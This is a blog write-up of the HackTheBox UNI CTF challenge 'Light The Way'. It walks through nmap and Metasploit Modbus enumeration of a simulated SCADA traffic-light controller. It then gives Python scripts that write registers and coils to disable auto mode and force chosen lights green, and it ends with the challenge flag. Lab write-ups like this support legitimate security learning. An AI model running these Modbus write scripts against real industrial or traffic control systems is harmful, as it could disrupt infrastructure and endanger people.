---
title: "HTB UNI CTF : Light The Way"
date: 2021-11-21T23:22:26-05:00
cover:
  image: "/hackthebox/unictf.png"
  alt: "UNI CTF" # alt text
  relative: false # when using page bundles set this to true
  hidden: false # only hide on current single page
categories:
    - CTF

---


Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.

![](/lighttheway/question.png)

## SCADA

Supervisory control and data acquisition is a system that allows industrial organizations to:

    * Conrtol processes
    * Monitor
    * Interact with devices
    * Record events

[For more information on SCADA](https://inductiveautomation.com/resources/article/what-is-scada)

## Starting Point

For this specific challenge, we needed to compromise traffic lights. There wasn't much information to work with, given only the IP address of the system. It was also in the same network, which makes things easier.


![](/lighttheway/HMI.png)

The given IP was : `10.129.96.95`

A website and the IP was all the information that I had. So, where did I begin?

## Nmap

Yep, nmap. It allows us to scan the system and find information on it.

```
nmap -p- 10.129.96.95 -sCV
```

![test](/lighttheway/nmap.png)

Key Points:
    
    * PORT 22 : used for SSH, I wouldn't even try to attack it
    * PORT 80 : running nginx server for the front end
    * PORT 502: This is the interesting port. (I didn't knew it was interesting until I googled and found out that modbus uses it)


After figuring those stuff out, now's the time to enumerate more information on the Modbus.

```
nmap -p 502 --script modbus-discover 10.129.96.95
```

![](/lighttheway/nmap2.png)

Didn't give much but it confirms that Modbus is running on port 502.

### More info!

![](https://c.tenor.com/ayUs509YzsIAAAAC/kid-bored.gif)

What I have here isn't enough to make the exploit. So, what should I do?

Turning back to my good old friend, internet I found a metaspolit script `auxiliary/scanner/scada/modbus_findunitid`

Using the script, I was able to figure out that there are more than one unit in the given SCADA system. I didn't let the script complete, but there are more than 200 units.

***Why are there so many?***
There are 6 junctions in the picture, and if there are more than 200 does each unit control one light?

Before answerinng that question let's first look at what data the first unit has.


## Get DATA
Let's search if there's any more metaspolit script that we can use.

```
msf6> search modbus
```

After searching for modbus, I found 6 modules/scripts
```
Matching Modules
================

   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  auxiliary/analyze/modbus_zip                                     normal  No     Extract zip from Modbus communication
   1  auxiliary/scanner/scada/modbus_banner_grabbing                   normal  No     Modbus Banner Grabbing
   2  auxiliary/scanner/scada/modbusclient                             normal  No     Modbus Client Utility
   3  auxiliary/scanner/scada/modbus_findunitid       2012-10-28       normal  No     Modbus Unit ID and Station ID Enumerator
   4  auxiliary/scanner/scada/modbusdetect            2011-11-01       normal  No     Modbus Version Scanner
   5  auxiliary/admin/scada/modicon_stux_transfer     2012-04-05       normal  No     Schneider Modicon Ladder Logic Upload/Download
   6  auxiliary/admin/scada/modicon_command           2012-04-05       normal  No     Schneider Modicon Remote START/STOP Command
   ```


Modbusclient module seems to be the most useful for this case.
```
msf6> use auxiliary/scanner/scada/modbusclient
msf6 auxiliary(scanner/scada/modbusclient)> show options
```

![](/lighttheway/meta1.png)


So the RHOST for this  instance will be the IP address : `10.129.96.95`

```
set RHOST 10.129.96.95
```
We need to set where we want to start reading the DATA from to do that we need wo set the DATA_ADDRESS field
```
set DATA_ADDRESS 0
```

Then we need to set how many DATA_ADDRESS we want to read.

```
set NUMBER 18
```
![](/lighttheway/meta2.png)


Let's see what those numbers mean. 

This small python command takes the arr of int and converts to a string.

```
arr = [97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 116, 114, 117, 101]

print("".join(chr(x) for x in arr))
```

With the python script I was able to get a string: `auto_mode:true`

## Setting it to manual
If I remember correctly the description of the challenge wants us to set it to manual mode. Which means we need to set the auto_mode to false.


```
print([ord(x) for x in "auto_mode:false"])
```

Used this python script to get the numbers that we need to send in order to set the SCADA system to false. 

```
[97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 102, 97, 108, 115, 101]
```

I wrote a simple python script that uses the Perl Modbus library to write to the holding registry. 
![](https://c.tenor.com/zOAWdshu_I0AAAAd/boring-unimpressed.gif)

Yea, I later figured out that python had a library to connect to modbus, but anyways it works.

```
import subprocess

for i in range(1,20):                           #  :  f   a   l   s   e
    cmd = f"modbus write -w -s {i} 10.129.96.95 10 58 102 97 108 115 101"
    subprocess.run(cmd.split(" "))
```

```modbus {command} {type} {slaveid} {target_ip} {data_address} {information_to_write}```

I set it to the first 20 to see if that would make any difference. It didn't make any visual difference. But if I look at the registers again, it changed the values.


![](/lighttheway/meta3.png)
*First one is before running the script, second one is after running the python script.*

So, if that didn't change anything, what can I do?


Coils also store values, and I can read and write it. 

## Reading Coils

```
msf6 auxiliary(scanner/scada/modbusclient)> set action READ_COILS
```

Reading the first 18 coils, it was all just bunch of 0s so I decided to read 2000 of them to see if I find anything good.

```
msf6 auxiliary(scanner/scada/modbusclient)> set NUMBER 2000
```
![](/lighttheway/meta4.png)


After trying to get 2000 coils, I can see some interesting information. There are bunch of 1 in the middle. 

Let's see what other Units have.

```
msf6 auxiliary(scanner/scada/modbusclient)> set UNIT_NUMBER 2
```

UNIT_NUMBER determines which slave node we are viewing. 

After looking through 7 to 8 of them I found out that only 6 of it hold any valuable data. So, I concluded that each unit represents one junction. 


```
from pyModbusTCP.client import ModbusClient

data_address = {}

for i in range(1,7):
    c = ModbusClient(host="10.129.96.95", port="502", unit_id=i, auto_open=True)

    regs = c.read_coils(0,2000)

    data_address[i] = regs.index(True)

print(data_address)
```

I wrote this script to get the DATA_ADDRESS of all the 1/True places.

```
{1: 571, 2: 1921, 3: 531, 4: 1267, 5: 925, 6: 888}
```

# The exploit?

Now I have all the necessary information on the data address of where they are reading the traffic data from, I can create a payload to change the traffic lights. 

The first three bits represents the North side of the light, and goes in order of 

Green Yellow Red 

IF we curl the api `http://10.129.96.95/api` we can see value for all the colors and the direction. 

![](/lighttheway/curl.png)


After doing some digging I found out that the API doesn't represent the data in the same way the registers stores the data. 

In the registers we need to pass in data as follow:

```
NG NY NR EG EY ER SG SY SR WG WY WR
```
![](/lighttheway/lights.png)

Looking at the picture we need to change the west side to green because the car is about to turn towards west for the first junction, and we have to turn the East side to Green for the 2nd and 4th junction, and finally the north side for 6th junction.

So the values for junction one are as follow:
```
[False, False, True, False, False, True, False, False, True, True, False, False]
```
This will turn on the green light on the west.

```
[False, False, True, False, False, True, False, False, True, False, False, True]
```


So, What I was saying about the direction didn't make any sense, I had to play around for a long time before I figured out the correct light to turn on. The placement of the lights didn't sense to me, it might be becuase the difference in driving in different country.

The following script did the job.

```
from pyModbusTCP.client import ModbusClient

data_address = {}

c = ModbusClient(host="10.129.96.95", port="502", unit_id=1, auto_open=True)
for i in range(1,7):
    c.unit_id(i)
    regs = c.read_coils(0,2000)

    data_address[i] = regs.index(True)

c.unit_id(1)
c.write_multiple_coils(571,[False, False, True, False, False, True, False, False, True, True, False, False])

c.unit_id(2)
c.write_multiple_coils(1920, [True, False, False, False, False, True,False, False, True, False, False, True])


c.unit_id(4)
c.write_multiple_coils(1266, [False, False, True, False, False, True,False, False, True, True, False, False])


c.unit_id(6)
c.write_multiple_coils(886,[False, False, True, False, False, True, False, False, True, True, False, False])
```

After running the script, the car moved and I found the flag.

![](/lighttheway/lighttheway.gif)

Flag:```HTB{w3_se3_tH3_l1ght}```

